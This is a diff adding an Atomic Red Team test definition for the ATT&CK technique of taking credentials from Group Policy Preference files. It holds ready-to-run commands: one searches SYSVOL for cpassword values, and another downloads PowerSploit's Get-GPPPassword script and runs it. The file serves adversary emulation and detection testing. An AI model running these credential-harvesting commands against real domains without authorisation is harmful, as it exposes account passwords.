@@ -1,0 +1,61 @@
+attack_technique: T1552.006
+display_name: "Unsecured Credentials: Group Policy Preferences"
+atomic_tests:
+- name: GPP Passwords (findstr)
+  auto_generated_guid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Computer must be domain joined
+    prereq_command: |
+      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Joining this computer to a domain must be done manually
+  executor:
+    command: |
+      findstr /S cpassword %logonserver%\sysvol\*.xml
+    name: command_prompt
+
+- name: GPP Passwords (Get-GPPPassword)
+  auto_generated_guid: e9584f82-322c-474a-b831-940fd8b4455c
+  description: |
+    Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
+    This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
+    The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.
+
+    Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".
+  supported_platforms:
+  - windows
+  input_arguments:
+    gpp_script_url:
+      description: URL of the Get-GPPPassword PowerShell Script
+      type: url
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+    gpp_script_path:
+      description: Path to the Get-GPPPassword PowerShell Script
+      type: Path
+      default: PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+    prereq_command: |
+      if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 }
+    get_prereq_command: |
+      New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
+      Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
+  - description: |
+      Computer must be domain joined
+    prereq_command: |
+      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Joining this computer to a domain must be done manually
+  executor:
+    command: |
+      . #{gpp_script_path}
+      Get-GPPPassword -Verbose
+    name: powershell
